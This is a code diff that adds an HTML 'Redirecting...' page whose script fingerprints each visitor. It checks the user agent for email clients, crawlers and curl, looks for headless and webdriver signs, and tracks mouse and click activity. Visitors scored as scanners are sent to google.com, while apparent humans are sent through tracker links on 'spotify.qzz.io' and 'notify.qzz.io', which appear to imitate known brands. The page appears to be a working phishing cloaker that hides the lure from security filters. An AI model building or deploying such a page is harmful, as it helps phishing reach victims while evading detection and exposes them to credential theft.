@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body{margin:0;font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh}
+        .box{text-align:center;padding:20px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .spin{width:20px;height:20px;border:2px solid #ddd;border-top:2px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .msg{color:#666;font-size:14px}
+        #backup{display:none;margin-top:15px;color:#1877f2;text-decoration:none}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spin"></div>
+        <div class="msg">Redirecting...</div>
+        <a href="#" id="backup">Continue</a>
+    </div>
+    <script>
+        // Enhanced bot detection with interaction tracking
+        const d = () => {
+            let s = 0;
+            let ua = navigator.userAgent.toLowerCase();
+            let startTime = Date.now();
+            let hasInteraction = false;
+            let mouseMovements = 0;
+            let clickEvents = 0;
+
+            // Check email clients & obvious bots
+            if (/outlook|thunderbird|mailkit|bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 6;
+
+            // Check missing features (comprehensive but VPN-friendly)
+            if (!window.localStorage || !window.requestAnimationFrame || !window.JSON) s += 4;
+            if (navigator.webdriver || window._phantom || window.callPhantom) s += 5;
+            if (screen.width < 100 || screen.height < 100) s += 3;
+
+            // Check for headless indicators
+            if (!window.outerHeight || !window.outerWidth) s += 2;
+            if (navigator.plugins.length === 0) s += 1;
+
+            // Check browser-specific features
+            if (!window.chrome && /chrome/.test(ua)) s += 2; // Chrome without window.chrome
+
+            // Enhanced interaction tracking
+            const trackInteraction = () => {
+                hasInteraction = true;
+            };
+
+            const trackMouse = () => {
+                mouseMovements++;
+                hasInteraction = true;
+            };
+
+            const trackClick = () => {
+                clickEvents++;
+                hasInteraction = true;
+            };
+
+            // Add comprehensive event listeners
+            document.addEventListener('mousemove', trackMouse);
+            document.addEventListener('click', trackClick);
+            document.addEventListener('keydown', trackInteraction);
+            document.addEventListener('scroll', trackInteraction);
+            document.addEventListener('touchstart', trackInteraction);
+            document.addEventListener('touchmove', trackInteraction);
+
+            // Enhanced redirect logic
+            const performRedirect = () => {
+                const elapsedTime = (Date.now() - startTime) / 1000;
+
+                // Calculate final bot score (VPN-friendly)
+                if (!hasInteraction) s += 3;
+                if (mouseMovements < 1) s += 2;
+                if (clickEvents === 0 && mouseMovements === 0) s += 1;
+                if (elapsedTime < 1.5) s += 2; // Too fast but more lenient
+
+                // Prepare redirect URLs with tracking parameters
+                const baseReal = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io';
+                const baseSafe = 'https://google.com';
+                const jsParam = '&js=1';
+                const delayParam = `&delay=${elapsedTime.toFixed(2)}`;
+                const interactionParam = `&interactions=${mouseMovements + clickEvents}`;
+
+                const realUrl = baseReal + jsParam + delayParam + interactionParam;
+                const safeUrl = baseSafe;
+
+                // Redirect based on bot score (threshold: 4, VPN-friendly)
+                location.href = s >= 4 ? safeUrl : realUrl;
+            };
+
+            // Minimum delay before redirect
+            setTimeout(performRedirect, 2500);
+
+            // Backup link setup
+            setTimeout(() => {
+                const backupEl = document.getElementById('backup');
+                if (backupEl) {
+                    backupEl.style.display = 'block';
+                    backupEl.href = 'https://notify.qzz.io/tracker/click.php?goto=https://notify.qzz.io&js=1&delay=manual&interactions=manual';
+                }
+            }, 4000);
+
+            // Final timeout redirect (extended for more interaction time)
+            setTimeout(() => {
+                if (window.location.href.indexOf('spotify.qzz.io') === -1 &&
+                    window.location.href.indexOf('google.com') === -1) {
+                    location.href = 'https://notify.qzz.io/tracker/click.php?goto=https://notify.qzz.io&js=1&delay=timeout&interactions=timeout';
+                }
+            }, 10000);
+        };
+
+        // Enhanced initialization
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', d);
+        } else {
+            d();
+        }
+
+        // Fallback initialization
+        window.addEventListener('load', () => {
+            if (!window.botDetectionStarted) {
+                window.botDetectionStarted = true;
+                d();
+            }
+        });
+    </script>
+</body>
+</html>
